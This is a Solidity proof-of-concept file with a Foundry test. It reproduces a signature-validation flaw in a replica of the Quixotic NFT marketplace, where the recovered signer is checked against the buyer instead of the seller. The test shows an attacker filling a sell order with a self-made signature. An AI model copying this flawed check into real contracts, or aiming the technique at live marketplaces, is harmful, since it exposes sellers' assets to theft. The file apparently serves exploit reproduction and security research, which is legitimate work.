// Minimal vulnerable replica (inline — do NOT import from ../src/)
contract CancellationRegistry {
    // Always returns 0 so orders are never considered cancelled in this PoC
    function getSellOrderCancellationBlockNumber(address, address, uint256) external pure returns (uint256) {
        return 0;
    }
}

contract Quixotic {
    struct SellOrder {
        address payable seller;
        address contractAddress;
        uint256 tokenId;
        uint256 startTime;
        uint256 expiration;
        uint256 price;
        uint256 quantity;
        uint256 createdAtBlockNumber;
        address paymentERC20;
    }

    CancellationRegistry public cancellationRegistry;
    mapping(uint256 => address) public lastBuyer; // minimal state to observe exploit

    constructor() {
        cancellationRegistry = new CancellationRegistry();
    }

    // Vulnerable function: uses signature check but compares recovered signer to msg.sender (buyer)
    // instead of the seller in the SellOrder. This lets a malicious buyer provide a signature
    // they made themselves and have the order accepted.
    function fillSellOrder(
        address payable seller,
        address contractAddress,
        uint256 tokenId,
        uint256 startTime,
        uint256 expiration,
        uint256 price,
        uint256 quantity,
        uint256 createdAtBlockNumber,
        address paymentERC20,
        bytes memory signature,
        address payable buyer
    ) external payable {
        if (paymentERC20 == address(0)) {
            require(msg.value >= price, "Transaction doesn't have the required ETH amount.");
        }

        SellOrder memory sellOrder = SellOrder(
            seller,
            contractAddress,
            tokenId,
            startTime,
            expiration,
            price,
            quantity,
            createdAtBlockNumber,
            paymentERC20
        );

        require(
            cancellationRegistry.getSellOrderCancellationBlockNumber(seller, contractAddress, tokenId) < createdAtBlockNumber,
            "This order has been cancelled."
        );

        require(_validateSellerSignature(sellOrder, signature), "Signature is not valid for SellOrder."); // vulnerable point

        require((block.timestamp > startTime), "SellOrder start time is in the future.");
        require((block.timestamp < expiration), "This sell order has expired.");

        _fillSellOrder(sellOrder, buyer);
    }

    // Vulnerable: recovers signer and compares to msg.sender (buyer) instead of sellOrder.seller
    function _validateSellerSignature(SellOrder memory sellOrder, bytes memory signature) internal view returns (bool) {
        if (signature.length != 65) return false;
        bytes32 digest = keccak256(abi.encodePacked(sellOrder.seller)); // signer only bound to seller address (and bug compares to buyer)
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := mload(add(signature, 0x20))
            s := mload(add(signature, 0x40))
            v := byte(0, mload(add(signature, 0x60)))
        }
        address signer = ecrecover(digest, v, r, s);
        // BUG: should compare signer == sellOrder.seller, but compares to msg.sender
        return (signer == msg.sender);
    }

    function _fillSellOrder(SellOrder memory sellOrder, address payable buyer) internal {
        // Minimal state change to demonstrate exploit: record buyer for tokenId
        lastBuyer[sellOrder.tokenId] = buyer;
    }
}

contract QuixoticTest is Test {
    Quixotic target;
    uint256 attackerKey = 0xBEEF;
    address attacker;

    function setUp() public {
        target = new Quixotic();
        attacker = vm.addr(attackerKey);
    }

    function test_attacker_exploits_fillSellOrder() public {
        address payable seller = payable(address(0xABCD));
        uint256 tokenId = 1;
        // Build the same digest as the contract: keccak256(abi.encodePacked(seller))
        bytes32 digest = keccak256(abi.encodePacked(seller));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(attackerKey, digest);
        bytes memory signature = abi.encodePacked(r, s, v);

        vm.prank(attacker);
        target.fillSellOrder(
            seller,
            address(0x1234),
            tokenId,
            0, // startTime in past
            block.timestamp + 1 days,
            0, // price zero for simplicity
            1,
            1,
            address(0),
            signature,
            payable(attacker)
        );

        // Because _validateSellerSignature incorrectly accepts signatures recovered to msg.sender,
        // the attacker is able to fill an order for a seller without the seller's consent.
        assertEq(target.lastBuyer(tokenId), attacker);
    }
}

